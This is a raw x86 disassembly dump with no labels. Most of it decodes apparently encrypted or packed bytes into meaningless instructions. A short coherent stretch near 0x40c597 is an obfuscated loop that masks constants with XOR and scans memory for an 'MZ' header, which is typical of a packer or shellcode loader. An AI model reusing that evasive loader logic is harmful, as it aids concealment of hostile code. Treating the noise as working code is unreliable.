  40c060:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c061:	and    eax,DWORD PTR [edx]
  40c063:	xchg   edi,eax
  40c064:	test   DWORD PTR [edx+0x3f],eax
  40c067:	mov    al,BYTE PTR [ebp+0x7]
  40c06a:	test   al,0xce
  40c06c:	retf   
  40c06d:	and    al,0x97
  40c06f:	pop    ecx
  40c070:	mov    bl,0xed
  40c072:	adc    eax,0x41729f7d
  40c077:	pop    esp
  40c078:	inc    esi
  40c079:	fs mov cl,0xeb
  40c07c:	xor    eax,0x5c1085e3
  40c081:	aaa    
  40c082:	push   esp
  40c083:	sbb    ch,BYTE PTR ds:[edx+0x67]
  40c087:	ret    
  40c088:	xchg   ecx,eax
  40c089:	call   0x2e34:0x38b6c564
  40c090:	into   
  40c091:	lds    ebx,FWORD PTR [ecx-0x38]
  40c094:	xchg   DWORD PTR [edx],ebp
  40c096:	or     BYTE PTR [edi+ebx*1-0x9ec712b],ch
  40c09d:	out    0x72,al
  40c09f:	pop    edx
  40c0a0:	inc    esi
  40c0a1:	out    0x96,eax
  40c0a3:	icebp  
  40c0a4:	push   0x2e
  40c0a6:	pop    ecx
  40c0a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0a8:	mov    DWORD PTR [edx-0x1d4a4186],ecx
  40c0ae:	fdivr  st,st(7)
  40c0b0:	in     al,dx
  40c0b1:	and    cl,BYTE PTR [ecx+ecx*4-0x29]
  40c0b5:	mov    WORD PTR [ecx+0x49],ds
  40c0b8:	(bad)  [eax]
  40c0ba:	sub    eax,0x727432a
  40c0bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0c0:	pop    ebx
  40c0c1:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40c0c3:	mov    ch,0x66
  40c0c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0c6:	shr    bh,cl
  40c0c8:	dec    eax
  40c0c9:	call   0xaee274c0
  40c0ce:	inc    ebx
  40c0cf:	jbe    0x40c0d9
  40c0d1:	jne    0x40c0f9
  40c0d3:	inc    eax
  40c0d4:	inc    edi
  40c0d5:	push   0xffffffab
  40c0d7:	push   cs
  40c0d8:	inc    esi
  40c0d9:	jne    0x40c093
  40c0db:	push   ebp
  40c0dc:	push   edi
  40c0dd:	cmp    cl,BYTE PTR [eax]
  40c0df:	aaa    
  40c0e0:	mov    ebp,0xcb1eacc2
  40c0e5:	into   
  40c0e6:	pop    ebp
  40c0e7:	mov    cl,BYTE PTR es:[edx]
  40c0ea:	add    DWORD PTR [ecx-0x611bec7],ebp
  40c0f0:	(bad)  
  40c0f1:	(bad)  
  40c0f3:	mov    ds:0x250e20,eax
  40c0f8:	cdq    
  40c0f9:	push   esp
  40c0fa:	add    al,0xc4
  40c0fc:	add    DWORD PTR [edx-0x7c36a46e],eax
  40c102:	and    BYTE PTR [ebp+0x30650a13],ch
  40c108:	fsubr  DWORD PTR [edi]
  40c10a:	fwait
  40c10b:	adc    BYTE PTR [ebx-0x39],ch
  40c10e:	xor    edx,DWORD PTR [edx]
  40c110:	in     eax,0x8a
  40c112:	lahf   
  40c113:	imul   esp,DWORD PTR [ebp+0x26],0x412cbeb0
  40c11a:	jo     0x40c11d
  40c11c:	jb     0x40c165
  40c11e:	lods   eax,DWORD PTR ds:[esi]
  40c11f:	and    BYTE PTR [ebx+0x4f],al
  40c122:	cmp    BYTE PTR ds:0xd2900b5d,0xd5
  40c129:	lahf   
  40c12a:	shl    BYTE PTR [ecx+0x3c3e3b2a],cl
  40c130:	mov    ds:0x3a9927e7,eax
  40c135:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c136:	or     ebx,ebx
  40c138:	xor    eax,0xa650a85d
  40c13d:	pop    ds
  40c13e:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c140:	or     ch,ah
  40c142:	add    cl,BYTE PTR [ebx-0x2]
  40c145:	pop    esi
  40c146:	mov    ah,0x87
  40c148:	std    
  40c149:	dec    ebp
  40c14a:	(bad)  
  40c14b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c14c:	loope  0x40c1b9
  40c14e:	sbb    ax,0xa29b
  40c152:	ja     0x40c147
  40c154:	sub    esi,ebp
  40c156:	sub    dl,cl
  40c158:	outs   dx,BYTE PTR ds:[esi]
  40c159:	mov    esp,0xd948dfb
  40c15e:	jge    0x40c14e
  40c160:	sbb    al,0xd2
  40c162:	mov    bh,0x1c
  40c164:	test   BYTE PTR [ebp+0x7ab79335],ch
  40c16a:	fld    TBYTE PTR [eax+0x3b45bfe8]
  40c170:	nop
  40c171:	fld    st(0)
  40c173:	into   
  40c174:	pop    esi
  40c175:	in     eax,0x48
  40c177:	push   ds
  40c178:	jg     0x40c1d6
  40c17a:	and    BYTE PTR [esi+0x40],ah
  40c17d:	push   edi
  40c17e:	in     al,dx
  40c17f:	mov    edi,DWORD PTR [ebx-0xc104796]
  40c185:	sub    dl,BYTE PTR ds:0x8262438f
  40c18b:	xchg   ebx,eax
  40c18c:	cmp    cl,BYTE PTR [edx-0x31]
  40c18f:	mov    bl,0xf5
  40c191:	stc    
  40c192:	push   cs
  40c193:	fld    QWORD PTR [ecx-0x7b]
  40c196:	pop    eax
  40c197:	push   esp
  40c198:	fs jb  0x40c1f8
  40c19b:	push   ecx
  40c19c:	cmp    al,0x6d
  40c19e:	lods   al,BYTE PTR ds:[esi]
  40c19f:	imul   esp,DWORD PTR [eax+0x5c],0x1e947f97
  40c1a6:	jl     0x40c1f8
  40c1a8:	sub    ebx,DWORD PTR [ebp+0x61dabf7b]
  40c1ae:	push   ecx
  40c1af:	cwde   
  40c1b0:	pop    esp
  40c1b1:	int    0x8f
  40c1b3:	ja     0x40c22d
  40c1b5:	xchg   BYTE PTR [ecx],ch
  40c1b7:	dec    esi
  40c1b8:	fidiv  DWORD PTR [ebp+eax*4+0x5ebd5701]
  40c1bf:	mov    bh,0x8d
  40c1c1:	loope  0x40c1ab
  40c1c3:	adc    eax,0xd6beb53a
  40c1c8:	bound  eax,QWORD PTR [edx]
  40c1ca:	jno    0x40c241
  40c1cc:	js     0x40c20b
  40c1ce:	or     esi,DWORD PTR [edx]
  40c1d0:	or     esi,DWORD PTR [ebp-0x10]
  40c1d3:	mov    al,ds:0xf878395f
  40c1d8:	int3   
  40c1d9:	cmc    
  40c1da:	pop    esi
  40c1db:	mov    ecx,0x344dd41d
  40c1e0:	iret   
  40c1e1:	mov    WORD PTR [edi-0x346cd481],?
  40c1e7:	int    0x39
  40c1e9:	(bad)  
  40c1ea:	pop    ds
  40c1eb:	not    bl
  40c1ed:	mov    cl,0xa
  40c1ef:	test   DWORD PTR [esi+0x6],0x500cd7d6
  40c1f6:	je     0x40c20a
  40c1f8:	mov    al,ds:0xc01c0894
  40c1fd:	outs   dx,DWORD PTR ds:[esi]
  40c1fe:	lahf   
  40c1ff:	fwait
  40c200:	imul   eax,ebx,0xffffffab
  40c203:	neg    cl
  40c205:	pop    esi
  40c206:	adc    DWORD PTR [eax+edx*2+0x7e],esp
  40c20a:	gs xchg edx,eax
  40c20c:	xchg   edi,eax
  40c20d:	mov    dl,0xe6
  40c20f:	pop    esp
  40c210:	jno    0x40c22f
  40c212:	pop    edx
  40c213:	push   ebp
  40c214:	aam    0x2
  40c216:	into   
  40c217:	dec    ebp
  40c218:	mov    ebp,0xbda4b571
  40c21d:	jb     0x40c224
  40c21f:	xchg   esi,eax
  40c220:	jmp    0x40c208
  40c222:	xchg   esp,eax
  40c223:	jmp    0x40c1b9
  40c225:	ficom  DWORD PTR [ebx+0x1]
  40c228:	and    ebp,DWORD PTR [ecx-0x790648a]
  40c22e:	pop    ecx
  40c22f:	popa   
  40c230:	shr    al,1
  40c232:	fist   WORD PTR [edi-0x6d9f6913]
  40c238:	test   eax,ebp
  40c23a:	je     0x40c29e
  40c23c:	std    
  40c23d:	add    ch,cl
  40c23f:	imul   ecx,DWORD PTR [ecx],0xffffffdf
  40c242:	clc    
  40c243:	iret   
  40c244:	icebp  
  40c245:	or     esp,DWORD PTR [edx+0x19]
  40c248:	mov    esi,0x1d95d265
  40c24d:	nop
  40c24e:	push   cs
  40c24f:	pop    ss
  40c250:	das    
  40c251:	jl     0x40c2c0
  40c253:	aad    0x71
  40c255:	mov    ebx,0xc9decb24
  40c25a:	push   es
  40c25b:	mov    eax,0x55084c41
  40c260:	imul   esi,DWORD PTR [esi-0x7467f307],0xd73ff39a
  40c26a:	ins    BYTE PTR es:[edi],dx
  40c26b:	fdivr  DWORD PTR [eax]
  40c26d:	les    esi,FWORD PTR [ecx+0x54]
  40c270:	ds hlt 
  40c272:	pop    edx
  40c273:	or     al,0xc4
  40c275:	arpl   cx,si
  40c277:	pop    eax
  40c278:	cmp    BYTE PTR [ecx-0x4d],bh
  40c27b:	outs   dx,BYTE PTR ds:[esi]
  40c27c:	mul    BYTE PTR [ebx+edi*1-0x27]
  40c280:	push   eax
  40c281:	or     al,0x6a
  40c283:	mov    edi,0x4a2d7627
  40c288:	pminsw mm6,QWORD PTR [ebp-0x79ccb62d]
  40c28f:	cld    
  40c290:	fimul  WORD PTR [ebx+0x77]
  40c293:	push   eax
  40c294:	xchg   DWORD PTR [ecx-0x171c6448],esp
  40c29a:	or     al,0x6f
  40c29c:	fistp  QWORD PTR [eax]
  40c29e:	mov    ch,0x3b
  40c2a0:	lea    edx,[ecx+esi*4+0x3071933d]
  40c2a7:	pushf  
  40c2a8:	push   ecx
  40c2a9:	mov    ch,0xa7
  40c2ab:	add    ebp,DWORD PTR [esi-0x23047cbd]
  40c2b1:	pop    ebx
  40c2b2:	cmp    eax,0x4fe5b670
  40c2b7:	mov    es,WORD PTR [esi-0x527a10fe]
  40c2bd:	jp     0x40c262
  40c2bf:	sub    BYTE PTR [eax+0x1290faa9],dl
  40c2c5:	test   al,0x3d
  40c2c7:	adc    ch,ah
  40c2c9:	test   al,0x8
  40c2cb:	sub    ebp,DWORD PTR [edx+0x686b0490]
  40c2d1:	lahf   
  40c2d2:	inc    edi
  40c2d3:	and    DWORD PTR [edx-0xfd32f41],eax
  40c2d9:	add    al,0x9f
  40c2db:	pop    ecx
  40c2dc:	xchg   esi,ebp
  40c2de:	pop    ebx
  40c2df:	mov    bh,0xdd
  40c2e1:	rol    DWORD PTR [ebp-0x29],1
  40c2e4:	push   ds
  40c2e5:	and    DWORD PTR [ecx+ebp*8-0x13e63a63],edi
  40c2ec:	fwait
  40c2ed:	mov    eax,esp
  40c2ef:	sar    BYTE PTR [ebx],0xda
  40c2f2:	jns    0x40c2fb
  40c2f4:	dec    esi
  40c2f5:	mov    bh,0xa3
  40c2f7:	pop    ebp
  40c2f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2f9:	fcomp  DWORD PTR [ebx+0x1d92435a]
  40c2ff:	ret    0x4d85
  40c302:	shl    DWORD PTR [edi+0x10],cl
  40c305:	ins    BYTE PTR es:[edi],dx
  40c306:	adc    DWORD PTR [edx+ecx*2],ecx
  40c309:	popf   
  40c30a:	inc    eax
  40c30b:	mov    ch,0xf5
  40c30d:	ins    DWORD PTR es:[edi],dx
  40c30e:	mov    ds:0xeedddb47,al
  40c313:	lds    ebp,FWORD PTR [ecx]
  40c315:	stos   DWORD PTR es:[edi],eax
  40c316:	xchg   esi,eax
  40c317:	addr16 pop ebx
  40c319:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c31a:	pop    eax
  40c31b:	mov    esi,0x4990df88
  40c320:	clc    
  40c321:	out    0x63,eax
  40c323:	mov    esp,0xf8be7cfd
  40c328:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c329:	pop    esi
  40c32a:	fistp  DWORD PTR [esp+eax*4-0x7a]
  40c32e:	dec    ecx
  40c32f:	(bad)  
  40c330:	cdq    
  40c331:	ss loopne 0x40c37c
  40c334:	push   ds
  40c335:	mov    bl,0x7d
  40c337:	lds    edi,FWORD PTR [eax-0x48158516]
  40c33d:	mov    ah,0x13
  40c33f:	sbb    al,0xc8
  40c341:	test   al,0x6e
  40c343:	sahf   
  40c344:	outs   dx,BYTE PTR ds:[esi]
  40c345:	test   eax,0x74a92a2c
  40c34a:	pop    edx
  40c34b:	pusha  
  40c34c:	test   DWORD PTR [eax+ecx*4],0x8a1c5219
  40c353:	sbb    al,cl
  40c355:	push   es
  40c356:	add    esi,DWORD PTR [ebx]
  40c358:	jg     0x40c35f
  40c35a:	imul   esp,DWORD PTR [edx],0x77
  40c35d:	jmp    0x7f2367f5
  40c362:	clc    
  40c363:	mov    eax,0x12fb3c0c
  40c368:	jnp    0x40c3b5
  40c36a:	aas    
  40c36b:	in     eax,0xf
  40c36d:	shr    DWORD PTR [edi+0x1d],0x1a
  40c371:	or     al,BYTE PTR [eax+0x43]
  40c374:	lods   eax,DWORD PTR ds:[esi]
  40c375:	pop    ss
  40c376:	or     al,0x15
  40c378:	xchg   ecx,eax
  40c379:	jmp    0x40c34c
  40c37b:	adc    edx,DWORD PTR [edx-0x58]
  40c37e:	and    DWORD PTR [edx+0x37],0x34
  40c382:	fadd   DWORD PTR [ebx]
  40c384:	inc    edi
  40c385:	sbb    dl,BYTE PTR [edx+0x1e8ab337]
  40c38b:	stos   BYTE PTR es:[edi],al
  40c38c:	sbb    BYTE PTR [edi-0x4366e441],dh
  40c392:	jae    0x40c340
  40c394:	(bad)  
  40c395:	aad    0xf4
  40c397:	cld    
  40c398:	rol    esi,1
  40c39a:	jecxz  0x40c31d
  40c39c:	sub    dl,BYTE PTR [esi+0x5cb0202d]
  40c3a2:	std    
  40c3a3:	mov    ds:0xdf2d13ad,al
  40c3a8:	inc    edi
  40c3a9:	loop   0x40c38e
  40c3ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3ac:	pop    ss
  40c3ad:	sub    DWORD PTR [ebp-0x3a],esi
  40c3b0:	mov    esi,0xd6c97de
  40c3b5:	mov    ?,WORD PTR [esi+ebx*4]
  40c3b8:	neg    BYTE PTR [esi+0x64060928]
  40c3be:	adc    DWORD PTR [ebx],eax
  40c3c0:	pop    ecx
  40c3c1:	dec    edi
  40c3c2:	mov    edi,0xbfab7677
  40c3c7:	inc    ecx
  40c3c8:	fisub  DWORD PTR [edi-0x13]
  40c3cb:	out    0x55,al
  40c3cd:	hlt    
  40c3ce:	lods   eax,DWORD PTR ds:[esi]
  40c3cf:	stos   BYTE PTR es:[edi],al
  40c3d0:	cdq    
  40c3d1:	out    dx,eax
  40c3d2:	xchg   esi,eax
  40c3d3:	pop    edx
  40c3d4:	mov    ch,0x6c
  40c3d6:	stc    
  40c3d7:	mov    ecx,0x34f63263
  40c3dc:	ss push ss
  40c3de:	fbstp  TBYTE PTR [edi-0x1acfb86f]
  40c3e4:	pop    es
  40c3e5:	popf   
  40c3e6:	aam    0xfa
  40c3e8:	imul   ebx,esi,0xea0dba96
  40c3ee:	enter  0xa9ef,0xad
  40c3f2:	in     al,0x26
  40c3f4:	cmp    eax,0xece8aea5
  40c3f9:	lahf   
  40c3fa:	sub    dl,dh
  40c3fc:	inc    eax
  40c3fd:	jmp    0x40c417
  40c3ff:	mov    eax,0x6bd83ca8
  40c404:	cmc    
  40c405:	test   al,0x14
  40c407:	fidiv  WORD PTR [edx]
  40c409:	les    eax,FWORD PTR [edx+eiz*2]
  40c40c:	mov    BYTE PTR es:[ebp+0x7e],ah
  40c410:	call   0x2b71:0x460118a5
  40c417:	js     0x40c46f
  40c419:	popa   
  40c41a:	adc    DWORD PTR [ecx],eax
  40c41c:	inc    edx
  40c41d:	mov    eax,0xd5f94610
  40c422:	push   eax
  40c423:	(bad)
  40c426:	cmp    DWORD PTR [ebx+0x10],ebx
  40c429:	fstp   TBYTE PTR [eax-0x371785e4]
  40c42f:	xor    eax,0xb41b3557
  40c434:	adc    eax,DWORD PTR [ecx+0x6121e6ec]
  40c43a:	mov    ebx,ebp
  40c43c:	dec    eax
  40c43d:	sbb    esi,DWORD PTR [edx]
  40c43f:	cdq    
  40c440:	lds    eax,FWORD PTR [ebx-0x690afa16]
  40c446:	shl    BYTE PTR [edx-0x4d],1
  40c449:	hlt    
  40c44a:	pop    ebp
  40c44b:	dec    esp
  40c44c:	jle    0x40c4a6
  40c44e:	popf   
  40c44f:	ror    BYTE PTR [ebx],cl
  40c451:	mov    ebx,0x1adc1f44
  40c456:	fadd   DWORD PTR [esi+0x57]
  40c459:	add    BYTE PTR [edi-0x6e],ah
  40c45c:	arpl   WORD PTR [edi],bx
  40c45e:	lock sbb al,0xae
  40c461:	jnp    0x29aedc03
  40c467:	sar    DWORD PTR [edx],cl
  40c469:	add    edi,DWORD PTR [edi-0x68]
  40c46c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c46d:	mov    esp,0x8a27f93a
  40c472:	ins    BYTE PTR es:[edi],dx
  40c473:	fisubr WORD PTR [edx]
  40c475:	jbe    0x40c4c8
  40c477:	lea    esi,[ecx-0x79]
  40c47a:	mov    bl,0xd5
  40c47c:	outs   dx,DWORD PTR ds:[esi]
  40c47d:	push   eax
  40c47e:	jo     0x40c430
  40c480:	add    BYTE PTR [edx-0x1a],0xb1
  40c484:	jbe    0x40c40a
  40c486:	int    0x0
  40c488:	jle    0x40c465
  40c48a:	and    al,0xb9
  40c48c:	mov    BYTE PTR [esi],bl
  40c48e:	xchg   edx,edi
  40c490:	mov    ds:0x436ef381,eax
  40c495:	dec    ecx
  40c496:	(bad)  
  40c497:	mov    eax,0x74182262
  40c49c:	mov    dh,0x63
  40c49e:	mov    ebp,0x9ef902ad
  40c4a3:	dec    ebp
  40c4a4:	mov    al,0x77
  40c4a6:	popf   
  40c4a7:	mov    al,0x82
  40c4a9:	adc    bh,BYTE PTR [edi]
  40c4ab:	push   edi
  40c4ac:	and    DWORD PTR [esi-0xf],edx
  40c4af:	icebp  
  40c4b0:	mov    eax,0xb5b26654
  40c4b5:	sub    al,0x17
  40c4b7:	aad    0x24
  40c4b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4ba:	shl    DWORD PTR [ebp+0x32],cl
  40c4bd:	aad    0xf9
  40c4bf:	jl     0x40c452
  40c4c1:	mov    BYTE PTR [eax],bh
  40c4c3:	or     DWORD PTR [ecx],edx
  40c4c5:	mov    ecx,0xacb0fb6
  40c4ca:	lods   eax,DWORD PTR ds:[esi]
  40c4cb:	push   eax
  40c4cc:	lahf   
  40c4cd:	mov    dl,ch
  40c4cf:	mov    ah,0x81
  40c4d1:	pop    ebx
  40c4d2:	in     al,0x9a
  40c4d4:	sbb    al,0x2c
  40c4d6:	lock shl DWORD PTR [ebp-0x1b9c2554],1
  40c4dd:	test   BYTE PTR [eax-0xb],ah
  40c4e0:	sar    BYTE PTR [ebp+0x6e086def],0x55
  40c4e7:	jl     0x40c529
  40c4e9:	xchg   DWORD PTR [edi],ebp
  40c4eb:	mul    BYTE PTR [eax]
  40c4ed:	mov    dl,0x8f
  40c4ef:	and    al,BYTE PTR [edx]
  40c4f1:	dec    ebx
  40c4f2:	iret   
  40c4f3:	adc    ah,bh
  40c4f5:	std    
  40c4f6:	push   ecx
  40c4f7:	(bad)  
  40c4f8:	xchg   edx,eax
  40c4f9:	jecxz  0x40c4e1
  40c4fb:	or     BYTE PTR [esi+0x11],dh
  40c4fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4ff:	sbb    eax,0x32ee1e8c
  40c504:	cdq    
  40c505:	pop    esp
  40c506:	sbb    al,0xbb
  40c508:	and    eax,0x8b2b975e
  40c50d:	dec    BYTE PTR [edi+eiz*8]
  40c510:	xchg   DWORD PTR [eax-0x2072b135],esp
  40c516:	bnd jl 0x40c572
  40c519:	cdq    
  40c51a:	iret   
  40c51b:	test   DWORD PTR [edi-0x76],esp
  40c51e:	sti    
  40c51f:	jle    0x40c539
  40c521:	and    eax,0x505751f0
  40c526:	sub    al,0x15
  40c528:	(bad)  
  40c529:	push   0x5f
  40c52b:	jbe    0x40c5a2
  40c52d:	xor    al,0x2f
  40c52f:	cmp    eax,0xf6875eca
  40c534:	scas   eax,DWORD PTR es:[edi]
  40c535:	icebp  
  40c536:	mov    ebp,0x30082c5c
  40c53b:	not    DWORD PTR [eax]
  40c53d:	loopne 0x40c53c
  40c53f:	(bad)  
  40c541:	or     eax,0x7dad8deb
  40c546:	das    
  40c547:	das    
  40c548:	pop    edi
  40c549:	or     BYTE PTR [ebx],cl
  40c54b:	dec    eax
  40c54c:	or     DWORD PTR [ebx+ebx*8+0x0],0xcb7dd48f
  40c554:	or     cl,BYTE PTR [esi]
  40c556:	or     BYTE PTR [ecx],bl
  40c558:	mov    edi,0xdcb04df6
  40c55d:	jmp    0xbef:0x9d47dd77
  40c564:	mov    eax,0x6577aba2
  40c569:	xchg   ecx,eax
  40c56a:	jns    0x40c58c
  40c56c:	inc    edi
  40c56d:	jmp    0x40c5ae
  40c56f:	mov    al,0x7b
  40c571:	out    0x5d,al
  40c573:	jmp    0x7ea8:0x8e766cc9
  40c57a:	push   es
  40c57b:	scas   al,BYTE PTR es:[edi]
  40c57c:	or     al,0xeb
  40c57e:	ret    0xb3ed
  40c581:	pop    edx
  40c582:	imul   edx,DWORD PTR [edi+0x501fb1c1],0x52
  40c589:	and    bh,BYTE PTR [ecx+0x3f85b35]
  40c58f:	cmp    BYTE PTR [ecx+0x458bf87d],cl
  40c595:	or     al,0x8b
  40c597:	jge    0x40c5a5
  40c599:	xor    edi,ecx
  40c59b:	xor    eax,ecx
  40c59d:	lea    eax,[eax+edi*1+0x64e5c4]
  40c5a4:	mov    edi,DWORD PTR [ebp+0xc]
  40c5a7:	xor    edi,ecx
  40c5a9:	add    edi,edx
  40c5ab:	imul   eax,edi
  40c5ae:	mov    edi,DWORD PTR [ebp+0xc]
  40c5b1:	xor    edi,ecx
  40c5b3:	sub    edi,eax
  40c5b5:	mov    eax,DWORD PTR [ebp-0x4]
  40c5b8:	add    edi,edx
  40c5ba:	cmp    DWORD PTR [eax],edi
  40c5bc:	mov    eax,DWORD PTR [ebp-0x4]
  40c5bf:	mov    edi,DWORD PTR [ebp+0x10]
  40c5c2:	jg     0x40c5d5
  40c5c8:	xor    edi,ecx
  40c5ca:	mov    ebx,esi
  40c5cc:	sub    ebx,edi
  40c5ce:	add    DWORD PTR [eax],ebx
  40c5d0:	jmp    0x40c5db
  40c5d5:	xor    edi,ecx
  40c5d7:	add    edi,edx
  40c5d9:	add    DWORD PTR [eax],edi
  40c5db:	mov    eax,DWORD PTR [ebp-0x8]
  40c5de:	mov    edi,DWORD PTR [ebp-0x10]
  40c5e1:	mov    eax,DWORD PTR [eax]
  40c5e3:	xor    edi,ecx
  40c5e5:	add    edi,0x3272e1
  40c5eb:	not    edi
  40c5ed:	and    eax,edi
  40c5ef:	movsx  di,BYTE PTR [eax+0x1]
  40c5f4:	mov    ebx,0x3b51
  40c5f9:	sub    di,bx
  40c5fc:	mov    ebx,0x8a8d
  40c601:	xor    di,bx
  40c604:	mov    ebx,0x4f84
  40c609:	cmp    di,bx
  40c60c:	jne    0x40c634
  40c612:	movsx  di,BYTE PTR [eax]
  40c616:	mov    ebx,0x3b51
  40c61b:	sub    di,bx
  40c61e:	mov    ebx,0x8a8d
  40c623:	xor    di,bx
  40c626:	mov    ebx,0x4e71
  40c62b:	cmp    di,bx
  40c62e:	je     0x40c644
  40c634:	mov    edi,DWORD PTR [ebp-0x10]
  40c637:	xor    edi,ecx
  40c639:	mov    ebx,esi
  40c63b:	sub    ebx,edi
  40c63d:	add    eax,ebx
  40c63f:	jmp    0x40c5ef
  40c644:	mov    esi,DWORD PTR [ebp-0x14]
  40c647:	mov    esi,DWORD PTR [esi]
  40c649:	jmp    0x40e998
  40c64e:	dec    edi
  40c64f:	sub    edi,esi
  40c651:	pusha  
  40c652:	repz inc edx
  40c654:	or     esi,ebx
  40c656:	test   eax,0xa54b873c
  40c65b:	jbe    0x40c638
  40c65d:	push   ds
  40c65e:	mov    ds:0x4e7c7ce0,al
  40c663:	pop    edi
  40c664:	jl     0x40c6e2
  40c666:	imul   BYTE PTR [esi]
  40c668:	int3   
  40c669:	jno    0x40c64e
  40c66b:	jno    0x40c6ec
  40c66d:	sub    eax,0x906ed5a
  40c672:	aam    0xaf
  40c674:	div    edi
  40c676:	mov    dl,0x86
  40c678:	mov    al,0x3c
  40c67a:	call   0xc338:0x3837d65f
  40c681:	xor    al,0x63
  40c683:	test   DWORD PTR [esi+0x17f65e64],ebx
  40c689:	pop    esi
  40c68a:	add    BYTE PTR [edx+0x43],cl
  40c68d:	stos   BYTE PTR es:[edi],al
  40c68e:	call   0xf1a1e76e
  40c693:	imul   ebx,ebp,0xf8f407b3
  40c699:	rcr    eax,cl
  40c69b:	not    BYTE PTR [eax+edi*4]
  40c69e:	pmuludq mm3,QWORD PTR [ebx]
  40c6a1:	imul   ecx,edx,0xf765a527
  40c6a7:	mov    dl,0xc8
  40c6a9:	dec    ebp
  40c6aa:	or     DWORD PTR [esi],0x62040548
  40c6b0:	xor    eax,0xf8b09b2b
  40c6b5:	inc    edi
  40c6b6:	(bad)  
  40c6b8:	inc    eax
  40c6b9:	test   eax,0xbbf67d75
  40c6be:	faddp  st(0),st
  40c6c0:	fnstenv [eax+0xf]
  40c6c3:	pop    ebx
  40c6c4:	scas   eax,DWORD PTR es:[edi]
  40c6c5:	add    al,0x97
  40c6c7:	add    BYTE PTR [eax-0x2ba64ae9],ch
  40c6cd:	cmp    al,0x26
  40c6cf:	dec    esi
  40c6d0:	mov    ah,0x21
  40c6d2:	pop    edi
  40c6d3:	stos   BYTE PTR es:[edi],al
  40c6d4:	daa    
  40c6d5:	mov    cl,0xf0
  40c6d7:	mov    ds:0x7e3045e9,eax
  40c6dc:	add    DWORD PTR [edx-0x24],ebp
  40c6df:	imul   ecx,DWORD PTR ds:0x6130e40b,0xffffffa9
  40c6e6:	xchg   ebx,eax
  40c6e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6e8:	loope  0x40c737
  40c6ea:	ret    
  40c6eb:	sub    edx,DWORD PTR [ebx+ebp*2-0x6261eb8d]
  40c6f2:	xor    DWORD PTR [ecx+0x52],ebx
  40c6f5:	dec    edx
  40c6f6:	xchg   ecx,eax
  40c6f7:	ret    0x552e
  40c6fa:	aas    
  40c6fb:	or     dh,BYTE PTR [edx+0x5cfff388]
  40c701:	out    dx,al
  40c702:	ja     0x40c6aa
  40c704:	iret   
  40c705:	adc    DWORD PTR [edi+0x4f],eax
  40c708:	fs jge 0x40c76e
  40c70b:	dec    eax
  40c70c:	addr16 repz mov cl,0xec
  40c710:	call   0xd8ce0447
  40c715:	ins    BYTE PTR es:[edi],dx
  40c716:	and    eax,0xd1d73d95
  40c71b:	into   
  40c71c:	cs push esi
  40c71e:	xchg   ebp,eax
  40c71f:	or     ebx,DWORD PTR [eax-0x38]
  40c722:	sub    bl,BYTE PTR [esi-0x72a2566]
  40c728:	xor    DWORD PTR [ecx-0x28274ed6],eax
  40c72e:	xor    al,0x71
  40c730:	jnp    0x40c75e
  40c732:	out    0x80,al
  40c734:	xchg   esp,eax
  40c735:	mov    cl,0x0
  40c737:	stc    
  40c738:	cmp    eax,0x6f79fb2b
  40c73d:	dec    edx
  40c73e:	scas   al,BYTE PTR es:[edi]
  40c73f:	mov    ecx,ss
  40c741:	dec    ecx
  40c742:	(bad)  
  40c743:	cwde   
  40c744:	sub    ch,BYTE PTR [esi]
  40c746:	popa   
  40c747:	push   ebp
  40c748:	pop    esp
  40c749:	jnp    0x40c7c6
  40c74b:	adc    DWORD PTR [ecx-0x684ea175],edx
  40c751:	(bad)  [edi]
  40c753:	mov    ecx,0x45d7a200
  40c758:	sbb    dl,bl
  40c75a:	leave  
  40c75b:	rol    BYTE PTR [ecx+esi*2+0x72f077ff],cl
  40c762:	in     eax,dx
  40c763:	xor    esp,DWORD PTR fs:[ebx-0x250dfac5]
  40c76a:	jle    0x40c71f
  40c76c:	pop    ss
  40c76d:	xchg   esp,eax
  40c76e:	int3   
  40c76f:	in     al,dx
  40c770:	inc    eax
  40c771:	aad    0x8c
  40c773:	push   ebp
  40c774:	and    BYTE PTR [ebp+0x564e1128],0xd7
  40c77b:	enter  0xfdad,0x70
  40c77f:	shr    DWORD PTR [edx+esi*4],0xa2
  40c783:	push   ss
  40c784:	sub    DWORD PTR [ebx+0x51eb9419],ebx
  40c78a:	(bad)  
  40c78b:	jp     0x40c76c
  40c78d:	dec    esi
  40c78e:	enter  0xd058,0x96
  40c792:	mov    ds:0x12bf79aa,eax
  40c797:	add    ch,0xab
  40c79a:	push   si
  40c79c:	adc    DWORD PTR [ecx+edi*4+0x5754e49e],ecx
  40c7a3:	popf   
  40c7a4:	push   ds
  40c7a5:	(bad)  
  40c7a6:	jns    0x40c814
  40c7a8:	out    dx,al
  40c7a9:	mov    eax,ds:0xcaef8a53
  40c7ae:	pop    ds
  40c7af:	inc    ecx
  40c7b0:	in     eax,dx
  40c7b1:	pushf  
  40c7b2:	inc    ebx
  40c7b3:	cmp    DWORD PTR [edx],edi
  40c7b5:	xor    DWORD PTR [ecx+ecx*1],esp
  40c7b8:	dec    ebx
  40c7b9:	adc    bh,BYTE PTR [ecx+ebx*2+0x402206e8]
  40c7c0:	sti    
  40c7c1:	aad    0xd8
  40c7c3:	and    eax,0xca2c464
  40c7c8:	xchg   esp,eax
  40c7c9:	xchg   esp,eax
  40c7ca:	jae    0x40c773
  40c7cc:	shr    dh,1
  40c7ce:	jmp    0xdcb54073
  40c7d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7d4:	push   eax
